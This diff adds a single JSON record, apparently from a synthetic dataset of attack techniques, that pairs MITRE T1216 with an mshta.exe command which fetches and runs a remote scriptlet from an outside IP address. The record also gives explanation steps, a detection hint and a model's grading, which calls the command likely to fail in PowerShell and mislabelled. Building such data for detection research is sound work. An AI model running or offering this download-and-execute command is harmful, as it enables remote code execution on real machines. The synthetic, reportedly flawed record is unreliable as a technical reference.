@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "mshta.exe javascript:GetObject(\"script:https://198.51.100.55/a.sct\")",
+  "explanation": "Directly uses mshta as a script proxy to retrieve and run a remote scriptlet. mshta is a trusted Windows binary commonly allowed by policy.",
+  "rationale_steps": [
+    "From PowerShell, launch mshta with a javascript: URL to create a script execution context.",
+    "Invoke GetObject with the script: moniker to execute a remote .sct payload.",
+    "Relies on signed mshta to proxy execution; defenders should flag javascript:/script: pairs in mshta command lines."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-d150a3ab",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command has balanced parentheses and quotes and is parseable as a native process invocation.",
+        "semantic_score": 2,
+        "semantic_justification": "Although mshta can proxy remote scriptlets, in PowerShell the inner double quotes are stripped causing GetObject to receive an unquoted argument (likely failing), and the behavior maps more to Mshta/Signed Binary Proxy Execution than T1216 System Script Proxy Execution.",
+        "combined_score": 3.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T21:32:28.274523Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
